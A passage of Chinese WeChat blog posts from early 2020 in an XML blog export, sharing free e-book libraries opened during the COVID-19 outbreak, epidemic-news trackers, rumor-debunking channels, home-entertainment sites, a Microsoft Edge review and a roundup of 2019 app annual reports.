    <content type="text"><![CDATA[苏生不惑第 95 篇原创文章 今天本来是上班的日子，由于新型肺炎影响，很多公司延迟了上班时间。 新浪也是3-9号在家办公，10号开始回公司上班。这里有个建议看看节后上班，你准备好了吗？这里有份返岗人员防护建议 另外不少机构和网站推出了免费在线浏览电子书等服务，这里做个整理。 机械工业出版社 在肺炎疫情爆发的现在，机械工业出版社在积极配合、响应国家政策和号召的同时，免费向大众开放工程科技数字图书馆6000余种电子书阅读权限，相信读书的力量，定能陪伴大家一起度过疫情下的艰难时刻，为阻断疫情贡献力量。 用知识抗击疫情！机工社宣布开放工程科技数字图书馆， 全网免费共克时艰！ http://ebooks.cmanuf.com/比如这本 Java服务端研发知识图谱 http://ebooks.cmanuf.com/detail?id=3844pdf文件 http://ebooks.cmanuf.com/pdfReader?id=7781849F57A2A890DA47E41D2F23FABC1B44A6BEA9C993EE0A8E8FE257FCE718 可以直接用idm下载（公众号内回复 idm 获取软件）。也可以通过F12看到实际地址 https://cmpebooks.s3.cn-north-1.amazonaws.com.cn/books/6/978-7-111-61011-3_1-1/PDF/978-7-111-61011-3_1-1_2.pdf 电子工业出版社 电子工业出版社有限公司联合组织为全网提供免费的“悦”系列知识服务产品，希望能够用知识与学习帮助您缓解焦虑、自我提升、共抗疫情。 电子社开放悦系列知识库 全网免费 电子工业出版社开放电子书在线阅读https://yd.51zhy.cn，全网免费，限时2月1日到2月29日 。这本《人工智能导论》在线PDF https://yd.51zhy.cn/ebook/reader/index.html#/pdfReader?id=72414284 清华大学出版社清华大学出版社开放知识库！在正式开学之前（目前初定2月16日）全国各地用户‌无需登录/注册‌即可浏览 https://lib-nuanxin.wqxuetang.com/ 这本《计算机网络基础》在线PDF https://lib-nuanxin.wqxuetang.com/read/pdf/2175744 中国人民大学复印报刊 中国人民大学复印报刊资料库，简称“人大复印库”，是人大数媒科技（北京）有限公司以人民大学书报资料中心的复印报刊资料系列数据库为内容基础，辅以检索功能、期刊、论文推荐而成的人文科学、社会科学资料库。 中国人民大学复印报刊资料免费开放了 ，免费向全国注册用户开放。 http://ipub.exuezhe.com/index.html 全国报刊索引全国报刊索引免费开放全文库一个月（截止2月底）， 免费注册后，每个帐号可下载全文内容100次 http://www.cnbksy.com/home 北外网课北外网课平台免费开放了，考研英语、雅思托福、大学四六级、各种小语种，北外网课平台都有最权威最精华的免费网课，不是北外学子也能在这个假期享受到全面的外语教学资源 https://www.beiwaiclass.com/ 中国知网本次服务期暂定为2020年2月1日-3月3日，在此期间，中国知网提供如下免费服务。 https://piccache.cnki.net/index/images2009/other/2020/freeservice.html 天眼查 天眼查收录了全国超1.8亿家社会实体信息（含企业、事业单位、基金会、学校、律所等），包含上市信息、企业背景、企业发展、司法风险、经营风险、经营状况、知识产权等300多种数据维度，实现全量数据实时更新。 每个人15天免费VIP，想查什么就查一查吧 。https://m.tianyancha.com/h5/huodong/newxn?channelCode=TIGct 搜狗搜索搜狗搜索最新上线的“湖北同胞住宿查询”功能，能方便外出的湖北同胞最快时间查询所在地接受湖北同胞安置入住的酒店信息。守望相助，我们在一起！武汉加油 https://m.sogou.com/web/searchList.jsp?keyword=%E6%B9%96%E5%8C%97%E5%90%8C%E8%83%9E%E4%BD%8F%E5%AE%BF%E6%9F%A5%E8%AF%A2&amp;pid=sogou-waps-c8da655dbb57d68e&amp;s_from=ff11 中国医药信息查询平台为您提供权威医药信息查询疾病/病症/医院/医生/药品等信息。http://www.dayi.org.cn/最近口罩已经很难买了，如果你在杭州（北京暂时没有）可以在支付宝的城市服务每天19点30预约领取口罩，可以关注下。 最后发个支付宝红包，在公众号内回复 支付宝 获取支付宝口令红包，手慢无，祝大家工作愉快。 推荐历史文章: 10 秒钟给你的微信头像添加口罩 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 各大 APP 年度报告整理 那些有意思的谷歌/百度搜索彩蛋 春节假期在家无聊？来这里看看 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[春节假期在家无聊？来这里看看]]></title>
    <url>%2F2020%2F03%2F30%2F%E6%98%A5%E8%8A%82%E5%81%87%E6%9C%9F%E5%9C%A8%E5%AE%B6%E6%97%A0%E8%81%8A%EF%BC%9F%E6%9D%A5%E8%BF%99%E9%87%8C%E7%9C%8B%E7%9C%8B%2F</url>
    <content type="text"><![CDATA[苏生不惑第 94 篇原创文章 之前写过 快速了解新型肺炎疫情最新动态，这里再推荐一个新型冠状病毒肺炎确诊患者相同行程查询工具 http://2019ncov.nosugartech.com/ 输入车次和日期就可以查询那班车次是否有确诊者，如果有，可以及时自我隔离医学观察。 最近很多地方都不让拜年走动了，大家待家里肯定很无聊，于是有了各种段子，比如： 初五，有点转冷窗外树叶晃动了1693次，吹掉了486片，小鸟叫了196声，飞来飞去146次。我家厕所瓷砖有36片，地板铺了462片，玻璃29块，木地板2031块，家里大米有186436粒。衣柜衣服26件，裤子14条，袜子12双。筷子15双，碗20个。柯基毛还没数完，目前有15358条… 这里推荐几个轻松娱乐的网站/工具给大家。 刷影视剧之前写过 周末推荐几个好用的免费在线看电影网站，这里再分享个视频播放器 PotPlayer（公众号内回复 potplayer获取），这款视频播放器体积小、快速、解码能力强，可以直接观看电视台的直播节目，只需要找到直播源，双击直接使用potplayer打开即可，非常简单。 直播源一般是m3u、m3u8格式，只需要在谷歌搜索直播源 m3u 就有很多可供下载，比如 https://homenet6.github.io/list.m3u 或 http://kudian.xyz/tv.m3u。 国内各大卫视在线收看，比如看江苏卫视还有电影 当然我公众号也有部分剧可以看看。 另外推荐一个磁力聚合搜索引擎 https://magnetw.app/ ，一次搜索你想看的影视剧，支持Windows Mac。 塔防游戏https://yorg.io/ 这个在线塔防游戏手机电脑都能玩，还有中文版。 太鼓达人太鼓达人解压小游戏源自日本网站 https://aidn.jp/mikuwarp/ ，一个基于初音未来创作的减压神器，点击屏幕即可生成一段音乐，作者还有其他游戏在https://aidn.jp/contents/ 因为访问速度的原因有人开发了国内版本 https://static.hfi.me/mikutap/，而且还开源了 https://github.com/HFIProgramming/mikutap ，它是通过点击屏幕来让Miku发出可爱的声音，这个游戏非常简单，靠指尖触碰就可以自己创作一首歌曲。 电脑上可以疯狂敲键盘或者鼠标，手机上可以疯狂点击屏幕。 生成的音乐可以用 ScreenToGif 等软件录下来。 微博上不少人玩过 对应的还有安卓版 https://www.coolapk.com/apk/at.rbq.mikutap 小霸王超级玛丽和魂斗罗等经典游戏很多人小时候都玩过，这是网页版的小霸王 https://www.yikm.net/ 可以让你重温童年的乐趣。 PC 端 w s a d 分别是上下左右，j k 分别是攻击和跳，b 是选择，回车是开始。你要不来试试？ 逛故宫在线故宫博物院https://www.dpm.org.cn/Home.html 全景故宫让你身临其境逛故宫 http://webapp.vizen.cn/gugong_app_pc/index.html点击对应宫殿名字进入。 小汤山医院工地直播武汉先后开建火神山、雷神山两所小汤山模式医院，四千多万网友在线监工，24小时不间断直播。 雷神山直播地址 https://m.yangshipin.cn/video?type=2&amp;pid=600016637&amp;ptag=4_1.0.5.15187_copy&amp;ptag=4_1.1.0.20230_copy 火神山直播地址 https://m.yangshipin.cn/video?type=2&amp;pid=600016618&amp;ptag=4_1.0.5.15187_copy&amp;ptag=4_1.1.0.20230_copy https://m.yangshipin.cn/static/2020/c0126.html?from=groupmessage&amp;isappinstalled=0 推荐历史文章: 10 秒钟给你的微信头像添加口罩 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 各大 APP 年度报告整理 那些有意思的谷歌/百度搜索彩蛋 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关注腾讯较真和微博辟谣，拒绝新型肺炎谣言]]></title>
    <url>%2F2020%2F03%2F30%2F%E5%85%B3%E6%B3%A8%E8%85%BE%E8%AE%AF%E8%BE%83%E7%9C%9F%E5%92%8C%E5%BE%AE%E5%8D%9A%E8%BE%9F%E8%B0%A3%EF%BC%8C%E6%8B%92%E7%BB%9D%E6%96%B0%E5%9E%8B%E8%82%BA%E7%82%8E%E8%B0%A3%E8%A8%80%2F</url>
    <content type="text"><![CDATA[目前已经确诊1300多例了 https://voice.baidu.com/act/newpneumonia/newpneumonia 如果你对新型冠状病毒不了解，可以看看这篇科普文《Stone小百科》–新型冠状病毒来了，你还不了解它吗？ 今天微博上看到的一张母子图片，扎心了。 然而这个时候还有人造谣。 这些网络传言真假难辨，有些人平时没人关注，这个时候就跳出来制造谣言带动舆论，从而成为焦点，真是。。。 辟谣渠道这里推荐2个官方辟谣渠道，第一个是 @微博辟谣 https://weibo.com/weibopiyao 然后是 腾讯较真 https://vp.fact.qq.com/home 这里搜索查证。 ​​​​ 他们还有对应的小程序版 提醒另外分享一个微博上的提醒 https://weibo.com/2952218365/IqMQC5LaX?type=comment 我再给首页提个醒，最近大家在家可能会经常用84消毒，84消毒液和洁厕灵不要混用，混用的话会产生氯气，氯气是有毒气体，严重的话危及生命，一定不要混用！切记！！！ ​​​​ 说84好多人不知道是啥，记住所有清洁用的洗涤剂消毒剂不要混合就行了，包括洁厕净去油污，陶瓷清洗剂，玻璃水，甚至洗发水沐浴露等等，都千万千万千万不要和消毒水，漂白水混合用，你担心厕所没有消毒，先用洁厕剂清洗干净马桶，再冲洗或者按压两次抽水马桶，最后消毒液和自来水1：99倒进去消毒。 还有勤洗手https://weibo.com/1401527553/IqXnG9Epb 洗手，同志们，洗手。别怕被那些把不讲卫生当做男子气概的人说是洁癖。要勇于微笑着说：是的，我就是洁癖。 ​​​​ 预防肺炎武汉协和医院的夏教授和他儿子、学生一起为大家拍摄的【预防肺炎】的视频，请大家照做，一定有用 https://weibo.com/1012406695/Ir6uPD4rx我把视频下载到百度网盘了，链接: https://pan.baidu.com/s/1nRe9HxYrbqt9tHBotYbK_Q 提取码: gfn7 ，需要的可以转到家里的微信群。 刷剧过年不出去就在家刷剧吧，这里推荐【凤凰大视野】五集纪录片《非典十年祭》，豆瓣9.4分！回顾17年前那场惊心动魄，没有硝烟的战斗 https://www.bilibili.com/video/av8132069/再就是 5集美剧《切尔诺贝利》http://v.qq.com/detail/i/ix6w4wausx518m8.html?ptag=10523，很现实很有意思。 另外《武林外传》其实是科教片，佟掌柜早就告诉你，为什么不要吃野味 。截图来自博主 LoveMatters 的整理，出现在第九集8分钟。 https://weibo.com/3149081847/IqvqWuAxH去爱奇艺重温下这部剧吧 http://www.iqiyi.com/a_19rrk2hct9.html?vfm=2008_aldbd 最后少出门，出门戴口罩，勤洗手，年可以在微信群拜或者明年再拜。 公众号 苏生不惑 下面是我的家族群，今年就不出去拜年了，祝大家度过一个平和的新年。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[10 秒钟给你的微信头像添加口罩]]></title>
    <url>%2F2020%2F03%2F30%2F10-%E7%A7%92%E9%92%9F%E7%BB%99%E4%BD%A0%E7%9A%84%E5%BE%AE%E4%BF%A1%E5%A4%B4%E5%83%8F%E6%B7%BB%E5%8A%A0%E5%8F%A3%E7%BD%A9%2F</url>
    <content type="text"><![CDATA[苏生不惑第 93 篇原创文章 昨天写过快速了解新型肺炎疫情最新动态 ，今天百度上线实时疫情通报，百度地图可查询发热门诊 其中百度迁徙系统可查看全国除港澳台外所有城市的迁徙状况，每个城市从春运首日至昨日的迁徙走势，以及全国热门路线、热门目的地、热门出发地。http://qianxi.baidu.com/ 现在口罩几乎脱销了，想买也买不到了，不过可以尝试下京东网页版的到货自动下单。然后选择替你下单。 ps:有人还开发了监控京东商品到货，并实现下单服务 https://github.com/shaodahong/jd-happy，如果你会代码可以试试这个。 除了实体的口罩，还可以给自己的微信头像也加上口罩，在公众号内回复 口罩 获取加口罩头像工具。 可以选择自己喜欢的样式然后保存到相册再更换为自己的微信头像 当然也可以使用小程序我要戴口罩。 推荐历史文章: 2020 新年福利，直接现金红包抽奖 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 各大 APP 年度报告整理 那些有意思的谷歌/百度搜索彩蛋 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[快速了解新型肺炎疫情最新动态]]></title>
    <url>%2F2020%2F03%2F30%2F%E5%BF%AB%E9%80%9F%E4%BA%86%E8%A7%A3%E6%96%B0%E5%9E%8B%E8%82%BA%E7%82%8E%E7%96%AB%E6%83%85%E6%9C%80%E6%96%B0%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[这几天武汉肺炎的事相信大家都一直在关注，这里分享几个网站/小程序让你更便捷的了解疫情最新动态。 财新新闻武汉肺炎防疫全纪录 http://m.app.caixin.com/m_topic_detail/1473.html 丁香医生全国新型肺炎疫情实时动态 https://3g.dxy.cn/newh5/view/pneumonia 实时新闻播报 微博热搜这几天的微博热搜都是关于武汉肺炎的https://s.weibo.com/top/summary?Refer=top_hot&amp;topnav=1&amp;wvr=6 尤其关注人民日报的微博滚动播报 https://weibo.com/rmrb 微信搜一搜热点话题在微信搜索 武汉肺炎 可以看到热点话题最新动态。 新浪新闻专题实时动态专题 https://news.sina.cn/zt_d/yiqing0121 维基百科 https://en.wikipedia.org/wiki/2019%E2%80%9320_outbreak_of_novel_coronavirus_(2019-nCoV) 维基百科上有确诊病例增长图，数据直观。https://zh.wikipedia.org/wiki/2019%E5%B9%B4%EF%BC%8D2020%E5%B9%B4%E6%96%B0%E5%9E%8B%E5%86%A0%E7%8B%80%E7%97%85%E6%AF%92%E8%82%BA%E7%82%8E%E4%BA%8B%E4%BB%B6 微信提醒通过微信服务号推送新型冠状病毒感染的肺炎相关动态http://domain.jiandan.live/healthy_remind.html 还有 丁香园疫情实时播报推送 小程序今天腾讯刚发布了 腾讯健康 小程序 还有 就诊助理 小程序 rss武汉肺炎疫情新闻动态rss https://docs.rsshub.app/other.html#wu-han-fei-yan-yi-qing-xin-wen-dong-tai 财新网 - 武汉肺炎防疫全纪录 https://rsshub.app/coronavirus/caixin丁香园 - 全国新型肺炎疫情实时动态 https://rsshub.app/coronavirus/dxy 最后呼吁大家尽量不出门，勤通风，勤洗手，出门戴口罩，保护好自己，过一个舒心年。 推荐历史文章: 2020 新年福利，直接现金红包抽奖 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 各大 APP 年度报告整理 那些有意思的谷歌/百度搜索彩蛋 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 新年福利，直接现金红包抽奖]]></title>
    <url>%2F2020%2F03%2F30%2F2020-%E6%96%B0%E5%B9%B4%E7%A6%8F%E5%88%A9%EF%BC%8C%E7%9B%B4%E6%8E%A5%E7%8E%B0%E9%87%91%E7%BA%A2%E5%8C%85%E6%8A%BD%E5%A5%96%2F</url>
    <content type="text"><![CDATA[苏生不惑第 91 篇原创文章 今年过年时间有点早，这不马上就要过年了，来给 苏生不惑 读者们送福利了，祝大家新年顺利，多赚钱多开心。 之前发过一次福利无套路，公众号 苏生不惑 抽奖送现金红包 这次依然是没有套路，一等奖抽一人现金66，二等奖抽10人每人6.6，直接在公众号 苏生不惑 内回复 抽奖 获取抽奖码进入小程序抽奖，祝大家好运，明年公众号继续更新，欢迎关注。 开奖时间为1月25日（即大年初一）8点，开奖后会微信通知你，然后点击立即领取就可以直接在小程序提现到微信（秒到账）了。 下面是我刚提现的。 另外在本文下面留言，新年祝福或者其他都可以，除夕1月24日12点前点赞数前10每人6.6红包，加我微信发微信红包。 最后分享一个我新建的微信圈子 知识精选，欢迎微信扫码免费加入一起来玩，如果你还不了解微信的圈子，先进来看看，另外过年的时候我会在圈子里发红包，期待下吧。 推荐历史文章: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 用 Markdown 写简历和 PPT 那些你用得上的镜像网站 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 各大 APP 年度报告整理 那些有意思的谷歌/百度搜索彩蛋 那些有意思的网站彩蛋 微软全新浏览器 Microsoft Edge 比 谷歌 Chrome 好用吗？ 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微软全新浏览器 Microsoft Edge 比 谷歌 Chrome 好用吗？]]></title>
    <url>%2F2020%2F03%2F30%2F%E5%BE%AE%E8%BD%AF%E5%85%A8%E6%96%B0%E6%B5%8F%E8%A7%88%E5%99%A8-Microsoft-Edge-%E6%AF%94-%E8%B0%B7%E6%AD%8C-Chrome-%E5%A5%BD%E7%94%A8%E5%90%97%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[苏生不惑第 90 篇原创文章 微软的IE浏览器是Windows上默认安装的浏览器，大家都用过，在还没有Chrome浏览器的时候没觉得它怎么不好用，直到后来谷歌出了Chrome浏览器，嗯，真香。然后IE的作用就变成了用来下载Chrome浏览器，反正安装新系统后我都是用IE浏览器下载安装Chrome浏览器，然后就彻底把IE忘了。 后来微软又开始自研Edge HTML内核的Edge浏览器，不过 2018 年放弃后转而使用谷歌的Chromium内核，经过近一年的测试，现在终于发布了适用于Windows 10、Windows 7和macOS 基于Chromium的Edge浏览器，就是下面这个。 我的常用浏览器是谷歌 Chrome，下面就来体验下Edge ，看它是否比谷歌好用。 安装之前的测试版下载地址 https://www.microsoftedgeinsider.com/zh-cn/，现在的正式版下载地址 https://www.microsoft.com/en-us/edge没有自定义安装目录的选项，这个不大爽，安装后可以导入你Chrome的书签和历史记录。 由于是基于 Chromium 的浏览器，版本号也和Chrome同步了 。 开发者工具开发者工具是我经常用的工具，之前写的那些你可能不知道的浏览器奇技淫巧提到很多实用技巧，控制台看起来和Chrome没什么不一样，不过比IE好用多了。 界面右键菜单比Chrome好看大气不少。 而且没有了Chrome隐藏地址栏www和HTTPS的操作，这个很赞。下面是Chrome 扩展没有扩展的浏览器是没有灵魂的，关于Chrome扩展之前就写过好几篇。 那些我常用的 Chrome 扩展 那些我常用的 Chrome 扩展（二） 那些我常用的 Chrome 扩展（三） 那些实用的 Chrome 扩展神器 那些实用的 Chrome 扩展神器（二） Chrome 浏览器扩展神器油猴 Chrome 浏览器扩展神器暴力猴 Edge 也有类似Chrome 的扩展商店 https://microsoftedge.microsoft.com/addons/category/Edge-Extensions?hl=zh-CN 比如这里下载一个下载视频的扩展https://microsoftedge.microsoft.com/addons/detail/apjbepmacnpdneiebljlfoejfcadpkff?hl=zh-CN然后下载这条微博视频https://weibo.com/2717930601/Iq6dDwqIB ，很方便。可惜自带的商店里扩展不多，没关系，它还支持安装Chrome商店的扩展。先设置允许来自其他商店的扩展。打开Chrome扩展地址后右侧有了添加按钮，直接安装就能使用了。 扩展管理跟谷歌一样，开启开发人员模式就可以自行安装扩展。 朗读网页这个功能很赞，能直接朗读网页的内容，支持几十种语言，直接右键就可以开启。这里先选择中文，然后一个女声会自动读取网页的文字，并高亮读到的文字。 不过不能选中文字朗读，需要的话你可以安装 Read Aloud 这款用来朗读网页的 Chrome 扩展，支持 40 多种语言，包括普通话、国语、粤语等，支持阅读 PDF，默认是女声。你可以自己选择想听的语言。然后选中文字朗读。 Read Aloud Chrome 扩展地址 https://chrome.google.com/webstore/detail/read-aloud-a-text-to-spee/hdhinadidafjejdhmfkjgnolgimiaplp 账号同步虽然Chrome很好用，但在国内登录谷歌账号就难住很多人，新版的 Edge 使用微软账户登陆，这样就可以在iOS、macOS、Android、Windows 10、’8、7等系统上同步所有内容，真的很方便。 总之，Edge 体验还是不错的，相比其他国产浏览器也没有乱七八糟的广告，如果你习惯使用 Chrome，可以切换到 Edge 试试。 最后分享一个我新建的微信圈子 知识精选，欢迎微信扫码免费加入一起来玩，如果你还不了解微信的圈子，先进来看看。 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 用 Markdown 写简历和 PPT 那些你用得上的镜像网站 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 各大 APP 年度报告整理 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 各大 APP 年度报告整理]]></title>
    <url>%2F2020%2F01%2F17%2F2019-%E5%90%84%E5%A4%A7-APP-%E5%B9%B4%E5%BA%A6%E6%8A%A5%E5%91%8A%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[苏生不惑第 89 篇原创文章 2019年过去了，各大APP都陆续出了年度报告，下面整理几个我常用APP的年度报告数据，可能不全，比如没有淘宝，抖音什么的。 微信微信是腾讯于 2011 年 1 月 21 日推出的，现在是国民APP了，2018年就出了个数据报告，在微信里打开https://support.weixin.qq.com/cgi-bin/mmsupport-bin/getopendays 这个链接或者扫码下面的二维码可以回顾下 。 2019年微信的数据报告可以看微信派的文章2019微信数据报告 可惜没有个人的数据报告。 还有微信读书也出了1亿用户选出的年度Top100本好书 公众号首先是壹伴助手出的你的2019年公众号年报已生成 ，下图是我的公众号。还有新榜的公众号年度回顾 https://www.newrank.cn/public/about/h5.html 微博2019 我的微博播报https://event.me.weibo.com/annual/bobao ，用微博扫码查看你的。全年数据包括微博数、转评赞及总阅读量。 谁最关心你，这个排名来自好友间的转评赞数量、相互@及同名超话打榜的数据。比如我就第一次在微博给杰伦打榜过。 还有你最常用的表情、词汇、最晚刷微博时间等数据。 关于2019的微博记忆可以看这条微博 https://www.weibo.com/2836149552/IlB8S5dPp 知乎知乎年度报告https://2019.zhihu.com/pc.html 主要有文章数、回答数、赞同数、感谢数等。 还有知乎2019 年度100问 https://event.zhihu.com/100questions/及知乎年度数码/时尚/影视榜 https://www.zhihu.com/blue-star/ranking 豆瓣2019年豆瓣年度报告https://m.douban.com/standbyme/annual2019 ，可以扫码查看你的数据报告。其中包括电影榜单https://movie.douban.com/annual/2019读书榜单https://book.douban.com/annual/2019音乐榜单https://music.douban.com/annual/2019 网易云音乐 网易云音乐2018年就出过听歌报告 https://st.music.163.com/c/year2018/z/index.html 2019年的听歌报告 https://st.music.163.com/c/year2019/id/index.html我的年度歌手是邓丽欣。 最后给你生成一份2019年度歌单 https://music.163.com/#/playlist?id=3185465896 b站b站出了个人数据报告和up主数据报告。 b站个人数据报告 https://www.bilibili.com/blackboard/timemachine2019.html ，pc上就能看。 b站up主荣誉年报 https://member.bilibili.com/studio/annyroal/yearly-honorup主荣誉年报话题https://t.bilibili.com/topic/name/UP%E4%B8%BB%E8%8D%A3%E8%AA%89%E5%B9%B4%E6%8A%A5/feed ，这里可以看到各个up主分享的年度报告。 还有2019年度百大UP主名单 https://www.bilibili.com/blackboard/activity-BPU2019.html 另外推荐你看看今年的b站晚会《2019 最美的夜》 https://www.bilibili.com/bangumi/play/ep307609 ，不比各大卫视的差，豆瓣评分9.1。开场曲向魔兽世界致敬。 支付宝支付宝账单一出，段子就出来了： 晒单几十万、几百万的朋友我也都标记了，日后有什么难处，大家都是朋友，多照顾一下！以前都不知道大家这么有钱 ，来私聊，让我们重新认识一下。 喜马拉雅关于喜马拉雅之前写过那些我常听的中文播客节目，2019年数据报告地址http://m.ximalaya.com/web-support/api/layout/listen-report/hy ps :如果你想下载喜马拉雅音频可以在公众号回复 喜马拉雅获取。 Pythonpython 2018 也出过榜单 https://annual2018.pycourses.com/#12019榜单https://annual2019.pycourses.com/#1 网易新闻网易新闻每年都会出个娱乐圈画传，挺有意思的，http://wp.m.163.com/163/page/ent/ent_painting2019/index.html 文末点击阅读原文查看，今年的背景音乐是《好春光》。 最后分享一个我今天新建的微信圈子，欢迎加入一起来玩。 还有哪些 APP 也出了年度报告，或者你的 2019 年度报告有哪些有意思的数据？欢迎在评论区留言分享。 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2020 春节买火车票攻略和抢票工具分享 用 Markdown 写简历和 PPT 那些你用得上的镜像网站 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 年我在知识星球上都发了些什么 公众号：苏生不惑 其他2020=1024+996=404+404+404+404+404 ，2020将注定是不平凡的一年。2019 年各平台网站“回顾”收集https://cn.v2ex.com/t/631471#reply4 思否年度征文丨一起来总结你的 2019掘金年度征文 | 2019 与我的技术之路https://juejin.im/post/5def04e06fb9a01631780bec二十一世纪一零年代 我们的精神生活https://www.bilibili.com/read/cv4275164盘它！回顾2019那些奥利给的时刻！https://www.bilibili.com/read/cv4268139【 回形针的 2019 年度十佳】https://www.bilibili.com/read/cv4267925新年Flag https://t.bilibili.com/topic/name/%E6%96%B0%E5%B9%B4Flag/feed996笼罩下的互联网民工如何迎接2020|津津乐道 https://www.ximalaya.com/toutiao/31908470/239612396爆笑盘点2019国产烂片，暨第三届中国电影金菊花颁奖典礼https://www.bilibili.com/video/av80704154 烂片盘点年度最拉胯电影——《上海堡垒》年度最辣眼电影——《猪八戒·传说》年度最夹带私货犯罪片——《欲念游戏》年度最高开低走动画片——《小猪佩奇过大年》年度最酸臭爱情片——《下一任：前任》年度最闹心喜剧片——《断片之险途夺宝》年度最弱智悬疑片——《双生》年度最倒贴动作片——《素人特工》年度最点背演员——王大陆☆金菊花毕生成就奖——《相思鸟之恋》【新浪新闻年终盘点：#2019哪些瞬间值得被看见#】所有注视与记录，都是对世界的探索与碰撞。850多年历史的巴黎圣母院遭遇大火，30名凉山英雄牺牲，嫦娥四号第一次抵达月球背面，中国女排豪取11连胜，国庆70年大阅兵……这些瞬间就像风，裁出一个特别的2019。跨过这一瞬，即是新征程。2020，新浪新闻，继续记录每个瞬间。https://www.weibo.com/2028810631/ImwGK60Kw https://www.weibo.com/2591595652/Im6aQmfAT 2000年原来已经是20年前了，那一年发生了什么？https://www.bilibili.com/video/av81733008电影 电视剧 音乐 春晚活动作品【木鱼年度盘点】映像2019，最好的十部院线电影，最重要的十大人物和事件 2019githttps://oschina.gitee.io/gitee-2019-annual-report/?utm_source=gitee_widget你的 2019「最爱清单」，都在这些年度报告里https://sspai.com/post/58191 前往少数派 2019 年度盘点https://sspai.com/page/2019微吼年会https://live.photoplus.cn/activity/live/pc/95786123/#/live活动作品电影最TOP 142: 2019年度十大国产烂片盘点https://www.bilibili.com/video/av82547740木鱼水心】盘点2019年度十大失望电影，十大尴尬时刻（映像2019）https://www.bilibili.com/video/av82737707电影最TOP 141: 2019年度十大国产佳片盘点https://www.bilibili.com/video/av81490129【木鱼年度盘点】映像2019，最好的十部院线电影https://www.bilibili.com/video/av81552476难以超越的巅峰，电影百年的不朽传奇！——永远的1994 https://www.bilibili.com/video/av805290582019微信最火表情出炉 https://mp.weixin.qq.com/s/JuYQGPDzBshEvjPWIhphbQ《微信年度报告》：最受欢迎表情包有变https://mp.weixin.qq.com/s/rVjkori3glE7irgwtlTRgw 2019年中国微信500强年榜 | 新榜出品 https://mp.weixin.qq.com/s/9Co6wtDlxk0_I5KU4Rue1Qhttps://event.zhihu.com/zhihu2019/index_pc.html 豆瓣2018年度电影榜单，这一年的好电影全在这里了！ http://ailongmiao.com/read/411.html知乎 2019年度报告https://mp.weixin.qq.com/s/zmPC8j7axbRlrNq3eX5pWA2018年豆瓣就出了电影榜单https://movie.douban.com/annual/2018网易云音乐2018年度歌单 https://music.163.com/#/playlist?id=26104842532019听歌报告 https://mp.music.163.com/5de4b120050ae4f05cd61355/index.html2019年度最热新歌TOP50 https://music.163.com/#/playlist?id=3172849329 2020当头一棒：阅读最高的，竟然是这些文章 小姐姐味道https://mp.weixin.qq.com/s/LnKNW9mUs5DXghRMcgqTbw2019年赚钱文章合集 https://mp.weixin.qq.com/s/xVSl0pjt1V-1ra5bQOLjPw摸鱼新媒体导航： https://www.moyu.link/架构师之路，19年文章精选120篇 https://mp.weixin.qq.com/s/syli7vs7Jw_VOTl5B2YUqg数据分析干货集锦https://mp.weixin.qq.com/s/daxEYyAdBUHMSKVUqe9YrA公众号互推，一键生成互推文 https://mp.weixin.qq.com/s/S-i4oxwqLI3_ImYOBlNaIwhttps://www.ershicimi.com/rank小青蛙2019年原创文章集锦 https://mp.weixin.qq.com/s/gZHKmC8G4oroJ7yC3ldL1g真人出镜 | 副业收入超过主业收入，我是怎么做到的？ https://mp.weixin.qq.com/s/rzjbnyEInFW58uNlHl0PpAhttps://www.bilibili.com/video/av81184079/?redirectFrom=h5微信关键词自动回复，批量导入！ https://mp.weixin.qq.com/s/pghqy3YeWdn58_qnP19SZw微信书 https://mp.weixin.qq.com/s/ZZCJLGwF0MRX523FfBLxlQ生成报告地址: https://githubreport.mdnice.com需要github授权法纳斯特 2019年文章汇总 https://mp.weixin.qq.com/s/KCDBcXrcWF5y1Qieoubdnghttps://wind-nest.com/zsxq-stormzhang-friends.html2019年抖音数据报告（完整版） https://mp.weixin.qq.com/s/mjzr2ssMpmDdVeMeiOTb3g用Python制作酷炫词云图，原来这么简单！https://mp.weixin.qq.com/s/MmX-urygxHuCkhucyvsFrQ https://mp.weixin.qq.com/s/MmX-urygxHuCkhucyvsFrQ各种生成器 